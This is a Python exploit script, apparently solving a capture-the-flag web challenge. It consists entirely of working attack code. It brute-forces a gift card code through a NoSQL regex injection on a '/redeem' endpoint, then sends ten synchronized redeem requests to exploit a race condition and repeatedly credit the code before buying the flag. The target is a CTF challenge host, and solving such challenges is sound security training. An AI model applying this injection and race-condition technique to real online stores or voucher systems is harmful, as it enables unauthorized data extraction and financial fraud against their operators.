from requests import Session
from string import ascii_letters, digits
from random import random
from requests_racer import SynchronizedSession

host = "http://speed.srdnlen.challs.it:80"

nosqli_path = "/redeem?discountCode[$regex]=^"
race_path = "/redeem"
path_register = "/register-user"
path_buy = "/store"
gift_card = ""
flag = ""

alphabet = ascii_letters + digits

# Function to register a user
def register_user(session, username, password):
    r = session.post(f'{host}{path_register}', json={'username': username, 'password': password})

def buy_flag(session):
    r = session.post(f'{host}{path_buy}', json={'productId': 4})
    response_json = r.json()  # Parse the JSON response
    flag = response_json.get("product", {}).get("FLAG", "FLAG not found")  # Safely get the FLAG value
    print(flag)


# Create a session
session = Session()

# Register a user
register_user(session, random(), 'srdnlen')

# Extract and print session cookies
cookies = session.cookies.get_dict()

# Main loop to discover the gift card code
while not flag.endswith("}"):
    if len(gift_card) == 6:
        break

    for c in alphabet:
        response = session.get(f"{host}{nosqli_path}{gift_card}{c}")
        if "Invalid discount code!" not in response.text:
            gift_card += c
            break  # Exit the loop when a match is found

#print(f"Discovered gift card: {gift_card}")

session.close()

# Create a session
session = Session()

# Register a user
register_user(session, random(), 'srdnlen')

# Extract and print session cookies
cookies = session.cookies.get_dict()

jwt_token = cookies.get('jwt', '')  # Default to empty string if 'jwt' is not found

headers = {
    "cookie": f"jwt={jwt_token}"  # Embeds the value of jwt_token
}

s = SynchronizedSession()

resp1 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp2 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp3 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp4 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp5 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp6 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp7 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp8 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp10 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)
resp9 = s.get(host+race_path, params={'discountCode': gift_card}, headers=headers)


s.finish_all()

buy_flag(session)